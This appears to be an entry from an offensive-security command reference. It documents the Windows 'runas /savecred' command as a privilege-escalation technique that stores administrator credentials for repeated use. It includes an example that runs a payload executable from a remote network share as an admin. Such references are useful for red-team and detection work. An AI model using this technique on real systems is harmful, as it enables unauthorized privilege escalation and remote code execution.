---
id: 0d5dceb3-4fc9-47f8-8375-09927dcce458
name: runas-execute-as-user-with-savecred
type: command
executor: cmd
data: 'runas /savecred /user:$_USERNAME $_PROGRAM'
output: null
created_at: '2023-04-06T03:56:29.949678+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - credential-storage
verified: true
validated: true
---

# runas-execute-as-user-with-savecred

## Command

```cmd
runas /savecred /user:$_USERNAME $_PROGRAM
```

## Description

Executes a program as another user and saves the entered credentials for future use, enabling repeated escalation without password re-entry.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /savecred | Saves credentials after first prompt | Yes |
| /user:$_USERNAME | User account to run as | Yes |
| $_PROGRAM | Command or executable | Yes |

## Examples

### Basic Usage

```cmd
runas /savecred /user:Administrator cmd.exe
```

### Advanced Usage

```cmd
runas /savecred /user:WORKGROUP\Admin "\\share\payload.exe"
```

Run remote payload.

## Expected Output

```
Enter the password for Administrator:
[New window opens; creds now stored]
```

## Related

- [[procedures/windows-privilege-escalation-via-runas]]
- [[commands/runas-execute-as-user]]
